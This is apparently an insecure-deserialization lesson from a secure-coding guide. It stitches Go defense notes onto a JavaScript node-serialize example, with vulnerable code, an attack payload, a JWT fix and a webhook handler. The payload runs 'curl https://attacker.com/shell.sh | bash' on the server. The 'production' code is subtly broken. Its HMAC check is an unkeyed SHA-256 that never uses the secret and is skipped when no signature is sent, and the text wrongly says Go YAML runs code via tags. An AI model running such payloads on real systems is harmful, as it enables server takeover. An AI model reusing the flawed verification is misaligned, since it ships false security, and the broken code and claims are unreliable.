**Defense in Depth Layers**:

1. **Type Allowlist Registry**: Only explicitly registered request types can be deserialized
```go
registry.Register("create_user", func() RequestHandler { return &CreateUserRequest{} })
// Unknown types are rejected with audit logging
```

2. **Two-Phase Decoding**: First decode only the type discriminator into RawMessage, then decode payload into the correct concrete type
```go
var envelope RequestEnvelope
json.Unmarshal(data, &envelope)  // Phase 1: type only
factory(envelope.Type).Decode(envelope.Payload)  // Phase 2: typed decode
```

3. **DisallowUnknownFields**: Prevent attackers from injecting unexpected fields
```go
decoder := json.NewDecoder(r.Body)
decoder.DisallowUnknownFields()  // Rejects {"type": "x", "__proto__": {...}}
```

4. **Request Size and Timeout Limits**: Prevent resource exhaustion attacks
```go
r.Body = http.MaxBytesReader(w, r.Body, 64*1024)
ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
```

**Additional Protections**:
- **Never use `encoding/gob` for untrusted input**: gob can instantiate any registered type
- **Avoid `yaml.Unmarshal` without SafeLoader**: YAML can execute arbitrary Go code via `!!` tags
- **Never deserialize directly into interface{}**: Always use concrete types
- **Comprehensive audit logging**: Track all deserialization attempts with request IDs for forensics
- **Rate limiting per endpoint**: Prevent deserialization-based DoS attacks

Deserializing untrusted data is extremely dangerous and has led to numerous remote code execution vulnerabilities. The node-serialize package vulnerability (CVE-2017-5941) allowed attackers to execute arbitrary code simply by sending a malicious serialized payload.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// VULNERABLE: Deserializing untrusted cookie data
app.get('/dashboard', (req, res) => {
  if (req.cookies.session) {
    // CRITICAL VULNERABILITY: Deserializing user-controlled data
    const sessionData = serialize.unserialize(
      Buffer.from(req.cookies.session, 'base64').toString()
    );

    res.json({
      message: `Welcome back, ${sessionData.username}`,
      preferences: sessionData.preferences
    });
  } else {
    res.status(401).json({ error: 'No session found' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE (Immediately Invoked Function Expression)
const maliciousPayload = {
  rce: function() {
    require('child_process').execSync('curl https://attacker.com/shell.sh | bash');
  }()
};

// The serialized version contains executable code:
// {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl https://attacker.com/shell.sh | bash')}()"}
```

**Why This Is Dangerous**:
- node-serialize executes JavaScript functions embedded in serialized data during deserialization
- Attacker can execute arbitrary system commands on the server
- No authentication required if session cookie is the attack vector
- Server runs with application privileges, potentially root access

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const Joi = require('joi');

const app = express();
app.use(cookieParser());
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET.length < 32) {
  throw new Error('JWT_SECRET must be set and at least 32 characters');
}

// Schema for validating session data structure
const sessionSchema = Joi.object({
  userId: Joi.string().uuid().required(),
  username: Joi.string().alphanum().min(3).max(30).required(),
  preferences: Joi.object({
    theme: Joi.string().valid('light', 'dark').default('light'),
    language: Joi.string().valid('en', 'es', 'fr', 'de').default('en')
  }).default()
});

// SECURE: Using JWT with schema validation
app.get('/dashboard', (req, res) => {
  const token = req.cookies.session;

  if (!token) {
    return res.status(401).json({ error: 'No session found' });
  }

  try {
    // JWT verification - cryptographically signed, not executed
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],  // Explicitly specify allowed algorithms
      maxAge: '1h'            // Token expiration
    });

    // Schema validation - ensures data structure is safe
    const { error, value: sessionData } = sessionSchema.validate(decoded.data);

    if (error) {
      console.warn('Invalid session data structure:', error.message);
      return res.status(400).json({ error: 'Invalid session data' });
    }

    res.json({
      message: `Welcome back, ${sessionData.username}`,
      preferences: sessionData.preferences
    });
  } catch (err) {
    console.error('Session verification failed:', err.message);
    res.status(401).json({ error: 'Invalid or expired session' });
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT instead of serialization**: JWTs are cryptographically signed but NOT executed - they're just JSON with a signature
- **Schema validation with Joi**: Even after JWT verification, validate the data structure to ensure it matches expected types
- **Algorithm pinning**: Explicitly specify allowed JWT algorithms to prevent algorithm confusion attacks
- **Token expiration**: Limit token validity window to reduce impact of token theft

When handling complex data from external sources like APIs or message queues, you need multiple layers of protection. Even JSON.parse can be exploited through prototype pollution. Here's a production-ready approach:

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const { createHash, timingSafeEqual } = require('crypto');
const pino = require('pino');

const app = express();
const logger = pino({ level: process.env.LOG_LEVEL || 'info' });

// Initialize JSON Schema validator
const ajv = new Ajv({ 
  allErrors: true,
  removeAdditional: 'all',  // Strip unknown properties
  useDefaults: true,
  coerceTypes: false        // Don't auto-convert types
});
addFormats(ajv);

// Define strict schema for external data
const externalDataSchema = {
  type: 'object',
  additionalProperties: false,
  required: ['eventId', 'timestamp', 'payload'],
  properties: {
    eventId: { type: 'string', format: 'uuid' },
    timestamp: { type: 'string', format: 'date-time' },
    signature: { type: 'string', pattern: '^[a-f0-9]{64}$' },
    payload: {
      type: 'object',
      additionalProperties: false,
      properties: {
        userId: { type: 'string', format: 'uuid' },
        action: { type: 'string', enum: ['create', 'update', 'delete'] },
        data: {
          type: 'object',
          additionalProperties: false,
          maxProperties: 50,
          patternProperties: {
            '^[a-zA-Z][a-zA-Z0-9_]{0,63}$': {
              oneOf: [
                { type: 'string', maxLength: 10000 },
                { type: 'number' },
                { type: 'boolean' },
                { type: 'null' }
              ]
            }
          }
        }
      }
    }
  }
};

const validateExternalData = ajv.compile(externalDataSchema);

// Secure JSON parser that prevents prototype pollution
function safeJsonParse(jsonString, maxSize = 1048576) {
  // Size limit to prevent DoS
  if (jsonString.length > maxSize) {
    throw new Error(`Payload exceeds maximum size of ${maxSize} bytes`);
  }

  // Parse with prototype pollution protection
  const parsed = JSON.parse(jsonString, (key, value) => {
    // Block prototype pollution vectors
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      logger.warn({ key }, 'Blocked prototype pollution attempt');
      return undefined;
    }
    return value;
  });

  // Create clean object without prototype chain
  return JSON.parse(JSON.stringify(parsed));
}

// HMAC signature verification for external data
function verifySignature(payload, signature, secret) {
  const expectedSignature = createHash('sha256')
    .update(JSON.stringify(payload))
    .digest('hex');

  const sigBuffer = Buffer.from(signature, 'hex');
  const expectedBuffer = Buffer.from(expectedSignature, 'hex');

  if (sigBuffer.length !== expectedBuffer.length) {
    return false;
  }

  return timingSafeEqual(sigBuffer, expectedBuffer);
}

// Process external webhook/message queue data
app.post('/api/webhook', express.text({ type: '*/*', limit: '1mb' }), async (req, res) => {
  const requestId = req.headers['x-request-id'] || crypto.randomUUID();
  const startTime = Date.now();

  try {
    // Step 1: Safe JSON parsing
    let data;
    try {
      data = safeJsonParse(req.body);
    } catch (parseError) {
      logger.warn({ requestId, error: parseError.message }, 'JSON parse failed');
      return res.status(400).json({ error: 'Invalid JSON' });
    }

    // Step 2: Schema validation
    const isValid = validateExternalData(data);
    if (!isValid) {
      logger.warn({ 
        requestId, 
        errors: validateExternalData.errors 
      }, 'Schema validation failed');
      return res.status(400).json({ 
        error: 'Invalid data structure',
        details: validateExternalData.errors.map(e => e.message)
      });
    }

    // Step 3: Signature verification (defense in depth)
    const webhookSecret = process.env.WEBHOOK_SECRET;
    if (data.signature && webhookSecret) {
      if (!verifySignature(data.payload, data.signature, webhookSecret)) {
        logger.error({ requestId }, 'Signature verification failed');
        return res.status(401).json({ error: 'Invalid signature' });
      }
    }

    // Step 4: Process the validated, verified data
    logger.info({ 
      requestId,
      eventId: data.eventId,
      action: data.payload.action,
      processingTime: Date.now() - startTime
    }, 'Webhook processed successfully');

    // Safe to use data.payload now
    await processValidatedData(data.payload);

    res.json({ success: true, eventId: data.eventId });

  } catch (error) {
    logger.error({ requestId, error: error.message }, 'Webhook processing error');
    res.status(500).json({ error: 'Internal server error' });
  }
});

async function processValidatedData(payload) {
  // Business logic with already-validated data
  // No need to re-validate structure here
}

app.listen(3000);
